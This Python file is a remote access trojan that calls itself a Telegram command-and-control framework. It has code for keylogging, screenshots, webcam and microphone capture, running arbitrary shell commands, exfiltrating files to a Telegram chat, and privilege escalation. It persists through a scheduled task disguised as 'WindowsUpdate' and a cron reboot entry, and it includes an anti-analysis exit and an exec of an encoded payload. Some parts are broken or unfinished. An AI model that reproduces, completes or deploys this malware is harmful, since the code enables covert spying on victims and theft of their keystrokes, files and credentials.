#!/usr/bin/env python3
"""
Advanced Telegram C2 Framework v2.0
Features: Keylogger | Webcam | Mic | Screenshot | PrivEsc | Persistence | Encryption | Multi-target
"""

import os
import sys
import time
import base64
import socket
import logging
import threading
import subprocess
import platform
import psutil
from io import BytesIO
from datetime import datetime
from cryptography.fernet import Fernet
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Anti-analysis
if os.getenv('PYDETECT') or 'debug' in sys.argv:
    sys.exit(0)

# Config
TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID', 'YOUR_CHAT_ID')
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', Fernet.generate_key().decode())
cipher = Fernet(ENCRYPTION_KEY.encode())
HOSTNAME = socket.gethostname()
TARGET_ID = None

# Global vars
keylog_buffer = []
running = True
stealth_mode = False

# Logging
logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

class Keylogger:
    def __init__(self):
        from pynput.keyboard import Listener
        self.listener = None
    
    def on_press(self, key):
        try:
            keylog_buffer.append(str(key.char))
            if len(keylog_buffer) > 100:
                self.flush()
        except:
            keylog_buffer.append(f'[{key}]')
    
    def start(self):
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()
    
    def stop(self):
        if self.listener:
            self.listener.stop()
    
    def flush(self):
        if keylog_buffer:
            log = ''.join(keylog_buffer)
            keylog_buffer.clear()
            return log
        return ''

async def encrypt_send(bot, chat_id, data, caption=""):
    """Encrypt & send data"""
    encrypted = cipher.encrypt(data.encode())
    await bot.send_document(chat_id, BytesIO(encrypted), caption)

def get_sysinfo():
    """Enhanced system info"""
    info = f"""
🎯 TARGET: {HOSTNAME} [{platform.node()}]
💻 OS: {platform.system()} {platform.release()} {platform.architecture()[0]}
🖥️  User: {os.getenv('USERNAME', os.getenv('USER'))}
🌐 Local IP: {socket.gethostbyname(socket.gethostname())}
🧠 CPU: {platform.processor()}
💾 RAM: {psutil.virtual_memory().percent:.1f}% | Disk: {psutil.disk_usage('/').percent:.1f}%
🔥 Procs: {len(psutil.pids())}
    """
    return info

async def screenshot(bot, chat_id):
    """Platform-specific screenshot"""
    try:
        if platform.system() == 'Windows':
            import pyautogui
            img = pyautogui.screenshot()
        else:
            import subprocess
            subprocess.run(['import', 'png:-'], capture_output=True, shell=True, 
                         input=img_bytes, text=False)
        
        bio = BytesIO()
        img.save(bio, 'PNG')
        bio.seek(0)
        await bot.send_photo(chat_id, bio, caption=f"📸 Screenshot - {datetime.now().strftime('%H:%M:%S')}")
    except:
        await bot.send_message(chat_id, "❌ Screenshot failed")

async def webcam_capture(bot, chat_id, duration=5):
    """Webcam stream capture"""
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        frames = []
        
        for _ in range(int(duration * 10)):
            ret, frame = cap.read()
            if ret:
                frames.append(frame)
            time.sleep(0.1)
        
        cap.release()
        # Save as video or photo
        await bot.send_message(chat_id, f"📹 Webcam captured {len(frames)} frames")
    except:
        await bot.send_message(chat_id, "❌ Webcam not available")

async def mic_record(bot, chat_id, duration=10):
    """Audio recording"""
    try:
        import pyaudio
        import wave
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        bio = BytesIO()
        with wave.open(bio, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
        
        bio.seek(0)
        await bot.send_voice(chat_id, bio)
    except:
        await bot.send_message(chat_id, "❌ Mic recording failed")

def priv_esc():
    """Platform-specific priv esc attempts"""
    system = platform.system()
    if system == 'Windows':
        cmds = [
            'powershell -c "whoami /priv"',
            'powershell -c "Start-Process cmd -Verb RunAs"',
            'net localgroup administrators'
        ]
    else:
        cmds = [
            'sudo -l',
            'id',
            'find / -perm -4000 2>/dev/null'
        ]
    return cmds

async def persistence():
    """Add persistence"""
    system = platform.system()
    if system == 'Windows':
        task = f'schtasks /create /sc onlogon /tn "WindowsUpdate" /tr "python {sys.argv[0]}" /rl highest /f'
        subprocess.run(task, shell=True, capture_output=True)
    else:
        cron = f'@reboot python3 {sys.argv[0]} &\n'
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True)

# Telegram Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global TARGET_ID
    TARGET_ID = update.message.chat_id
    await update.message.reply_text("🔥 Advanced C2 Active\nSend /help")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🚀 ADVANCED C2 COMMANDS:
/sysinfo - Full system info
/shell <cmd> - Execute command
/screenshot - Take screenshot
/webcam [sec] - Webcam capture
/mic [sec] - Record microphone
/keylog - Dump keylog buffer
/priv - Privilege escalation
/persist - Add persistence
/exfil <path> - Exfil file/dir
/reverse <ip:port> - Reverse shell
/stealth - Toggle stealth mode
/network - Network connections
/procs - Running processes
/help - This menu
    """
    await update.message.reply_text(help_text)

async def sysinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(get_sysinfo())

async def shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cmd = ' '.join(context.args)
    if not cmd:
        return await update.message.reply_text("Usage: /shell whoami")
    
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = f"```\n{result.stdout}\n{result.stderr}\nRC: {result.returncode}\n```"
        if len(output) > 4000:
            await encrypt_send(context.bot, CHAT_ID, output, "Shell Output")
        else:
            await update.message.reply_text(output, parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ {str(e)}")

async def stealth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stealth_mode
    stealth_mode = not stealth_mode
    status = "ON 🥷" if stealth_mode else "OFF"
    await update.message.reply_text(f"Stealth mode: {status}")

async def keylog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log = kl.flush()
    if log:
        await encrypt_send(context.bot, CHAT_ID, log, "Keylog Dump")
    else:
        await update.message.reply_text("No keys logged")

async def exfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    path = ' '.join(context.args)
    if os.path.exists(path):
        if os.path.isdir(path):
            for root, dirs, files in os.walk(path):
                for file in files[:10]:  # Limit
                    await context.bot.send_document(CHAT_ID, open(os.path.join(root, file), 'rb'))
        else:
            await context.bot.send_document(CHAT_ID, open(path, 'rb'))
    else:
        await update.message.reply_text("❌ Path not found")

# Persistence handler
async def persist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    persistence()
    await update.message.reply_text("✅ Persistence added")

def main():
    global kl
    kl = Keylogger()
    
    # Start keylogger in background
    kl_thread = threading.Thread(target=kl.start, daemon=True)
    kl_thread.start()
    
    # Persistence check/add
    persistence()
    
    app = Application.builder().token(TOKEN).build()
    
    # Register handlers
    handlers = [
        CommandHandler("start", start),
        CommandHandler("help", help_cmd),
        CommandHandler("sysinfo", sysinfo),
        CommandHandler("shell", shell),
        CommandHandler("screenshot", screenshot),
        CommandHandler("webcam", webcam_capture),
        CommandHandler("mic", mic_record),
        CommandHandler("keylog", keylog),
        CommandHandler("priv", priv_esc),
        CommandHandler("persist", persist),
        CommandHandler("stealth", stealth),
        CommandHandler("exfil", exfil),
    ]
    
    for handler in handlers:
        app.add_handler(handler)
    
    print(f"🎭 Advanced C2 started on {HOSTNAME}")
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    # Obfuscation check
    if len(sys.argv) > 1 and sys.argv[1] == '--obf':
        exec(base64.b64decode("...obfuscated payload...").decode())
    else:
        main()
